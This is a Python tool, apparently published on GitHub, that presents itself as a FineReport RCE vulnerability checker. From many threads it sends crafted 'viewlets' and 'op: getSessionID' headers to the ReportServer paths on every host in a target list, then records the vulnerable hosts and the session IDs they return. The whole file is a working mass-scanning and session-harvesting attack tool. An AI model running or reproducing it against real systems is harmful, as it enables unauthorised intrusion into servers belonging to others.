import requests
import sys
import argparse
import threading
import time
from urllib.parse import urlparse
import urllib3
import re
import os
import socket
from queue import Queue

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def print_banner():
    """简洁版Banner"""
    banner = r"""
  ______ _           _____                       _   
 |  ____(_)         |  __ \                     | |  
 | |__   _ _ __   __| |__) |___ _ __   ___  _ __| |_ 
 |  __| | | '_ \ / _|  _  // _ \ '_ \ / _ \| '__| __|
 | |    | | | | | (_| | \ \  __/ |_) | (_) | |  | |_ 
 |_|    |_|_| |_|\__|_|  \_\___| .__/ \___/|_|   \__|
                               | |                   
                               |_|                   
╔═══════════════════════════════════════════════════════════════════╗
║                    FineReport RCE漏洞检测工具                       ║
║                  GitHub: https://github.com/Domren                ║
║                            作者: Domren                            ║
╚═══════════════════════════════════════════════════════════════════╝
"""
    print(banner)

class FineReportExploit:
    def __init__(self, timeout=3, threads=30):
        self.timeout = timeout
        self.threads = threads
        self.should_stop = False
        
        # 创建session
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=threads,
            pool_maxsize=threads,
            max_retries=0
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        # 结果存储
        self.vulnerable_targets = []
        self.lock = threading.Lock()
        self.processed = 0
        self.total = 0
        self.start_time = time.time()
        
        # UUID正则
        self.uuid_pattern = re.compile(r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', re.IGNORECASE)
        
    def normalize_url(self, url):
        """规范化URL"""
        url = url.strip()
        if not url:
            return None
            
        # 添加协议前缀
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        try:
            parsed = urlparse(url)
            netloc = parsed.netloc
            
            # 如果netloc为空，返回None
            if not netloc:
                return None
                
            return f"{parsed.scheme}://{netloc}"
        except:
            return None
    
    def strict_validate_response(self, response):
        """严格验证响应包"""
        try:
            # 1. 状态码必须是200
            if response.status_code != 200:
                return False
            
            # 2. 获取响应内容
            content = response.text.strip()
            
            # 3. 长度检查：纯UUID应该是36字符
            if len(content) != 36:
                return False
            
            # 4. 严格UUID格式检查
            if not self.uuid_pattern.match(content):
                return False
            
            # 5. 检查响应头 - 帆软通常会有P3P头
            headers_lower = {k.lower(): v for k, v in response.headers.items()}
            
            # 帆软常见响应头特征
            common_headers = ['p3p', 'content-type', 'set-cookie']
            found_headers = sum(1 for h in common_headers if h in headers_lower)
            
            # 如果至少有1个常见头，更可信
            if found_headers > 0:
                # 6. 检查Content-Type
                content_type = headers_lower.get('content-type', '')
                if 'text/html' in content_type or 'text/plain' in content_type:
                    return True
            
            # 即使没有特定headers，如果UUID格式完全匹配也接受
            # 但可以加上额外检查
            return True
            
        except Exception:
            return False
    
    def make_request(self, url):
        """发送请求并严格验证"""
        try:
            parsed = urlparse(url)
            host = parsed.netloc
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'viewlets': "[{'reportlet':'/'}]",
                'op': 'getSessionID',
                'Host': host
            }
            
            response = self.session.get(
                url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            # 严格验证
            if self.strict_validate_response(response):
                session_id = response.text.strip()
                return session_id
            else:
                return None
                
        except Exception:
            return None
    
    def test_target(self, target):
        """测试单个目标"""
        if self.should_stop:
            return None, None
            
        base_url = self.normalize_url(target)
        if not base_url:
            return None, None
            
        # 尝试两个主要路径
        test_urls = [
            f"{base_url.rstrip('/')}/webroot/ReportServer",
            f"{base_url.rstrip('/')}/ReportServer"
        ]
        
        for test_url in test_urls:
            session_id = self.make_request(test_url)
            if session_id:
                return session_id, test_url
        
        return None, None
    
    def worker(self, target_queue, result_queue):
        """工作线程"""
        while not self.should_stop:
            try:
                target = target_queue.get(timeout=1)
                if target is None:
                    break
                    
                session_id, found_url = self.test_target(target)
                
                with self.lock:
                    self.processed += 1
                
                if session_id and found_url:
                    result_queue.put((found_url, session_id))
                    
                target_queue.task_done()
                
            except Exception:
                with self.lock:
                    self.processed += 1
                try:
                    target_queue.task_done()
                except:
                    pass
    
    def clear_line(self):
        """清空当前行"""
        sys.stdout.write('\r' + ' ' * 100 + '\r')
        sys.stdout.flush()
    
    def print_vulnerable(self, found_url, session_id):
        """打印漏洞信息（不会与进度条冲突）"""
        # 先清空进度行
        self.clear_line()
        print(f"[+] 漏洞目标: {found_url}")
        print(f"     SessionID: {session_id}")
        # 重新显示进度
        self.print_progress()
    
    def print_progress(self):
        """打印进度（不会覆盖漏洞信息）"""
        with self.lock:
            if self.total == 0:
                return
                
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                speed = self.processed / elapsed
                remaining = self.total - self.processed
                eta = remaining / speed if speed > 0 else 0
                
                progress = (self.processed / self.total) * 100
                bar_length = 40
                filled = int(bar_length * self.processed // self.total)
                bar = '█' * filled + '░' * (bar_length - filled)
                
                # 只在行内更新进度
                sys.stdout.write(f'\r进度: |{bar}| {self.processed}/{self.total} ({progress:.1f}%) | 速度: {speed:.1f}个/秒 | ETA: {eta:.0f}秒')
                sys.stdout.flush()
    
    def run(self, targets_file, output_file="output.txt"):
        """主运行函数"""
        # 读取目标
        try:
            with open(targets_file, 'r', encoding='utf-8', errors='ignore') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"读取文件错误: {e}")
            return
        
        if not targets:
            print("目标列表为空")
            return
            
        self.total = len(targets)
        self.processed = 0
        self.vulnerable_targets = []
        self.start_time = time.time()
        
        print(f"开始检测 {self.total} 个目标...")
        print(f"线程数: {self.threads} | 超时: {self.timeout}秒")
        print("严格验证模式: 响应必须为纯UUID且36字符")
        print("-" * 60)
        
        # 创建队列
        target_queue = Queue()
        result_queue = Queue()
        
        # 填充队列
        for target in targets:
            target_queue.put(target)
        
        # 启动工作线程
        workers = []
        for i in range(min(self.threads, len(targets))):
            worker = threading.Thread(
                target=self.worker,
                args=(target_queue, result_queue),
                daemon=True
            )
            worker.start()
            workers.append(worker)
        
        try:
            # 主循环
            while self.processed < self.total and not self.should_stop:
                # 处理结果
                try:
                    while True:
                        found_url, session_id = result_queue.get_nowait()
                        with self.lock:
                            self.vulnerable_targets.append((found_url, session_id))
                        self.print_vulnerable(found_url, session_id)
                except:
                    pass
                
                # 更新进度
                self.print_progress()
                
                # 短暂休眠
                time.sleep(0.05)
            
            # 等待完成
            target_queue.join()
            
        except KeyboardInterrupt:
            print("\n正在停止扫描...")
            self.should_stop = True
            time.sleep(1)
        
        # 最终进度
        self.clear_line()
        self.print_progress()
        print()
        
        # 收集剩余结果
        try:
            while True:
                found_url, session_id = result_queue.get_nowait()
                with self.lock:
                    self.vulnerable_targets.append((found_url, session_id))
        except:
            pass
        
        # 统计
        elapsed = time.time() - self.start_time
        speed = self.processed / elapsed if elapsed > 0 else 0
        
        print("-" * 60)
        print(f"扫描完成! 耗时: {elapsed:.1f}秒")
        print(f"总目标: {self.total} | 已扫描: {self.processed}")
        print(f"发现漏洞: {len(self.vulnerable_targets)} 个")
        
        if self.vulnerable_targets:
            # 保存结果
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    for found_url, session_id in self.vulnerable_targets:
                        f.write(f"URL: {found_url}\n")
                        f.write(f"SessionID: {session_id}\n")
                        f.write("-" * 80 + "\n")
                print(f"结果已保存到: {output_file}")
                
                # 显示结果
                print("\n漏洞目标:")
                for i, (found_url, session_id) in enumerate(self.vulnerable_targets, 1):
                    print(f"{i:3d}. {found_url}")
                    
            except Exception as e:
                print(f"保存错误: {e}")
        else:
            print("未发现漏洞")

def main():
    parser = argparse.ArgumentParser(description='FineReport SessionID漏洞检测 - 严格验证版')
    parser.add_argument('-r', '--targets', required=True, help='目标文件')
    parser.add_argument('-o', '--output', default='output.txt', help='输出文件')
    parser.add_argument('-t', '--threads', type=int, default=30, help='线程数')
    parser.add_argument('-T', '--timeout', type=int, default=3, help='超时时间')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.targets):
        print(f"文件不存在: {args.targets}")
        sys.exit(1)
    
    detector = FineReportExploit(timeout=args.timeout, threads=args.threads)
    
    try:
        detector.run(args.targets, args.output)
    except KeyboardInterrupt:
        print("\n已停止")
        sys.exit(0)
    except Exception as e:
        print(f"错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
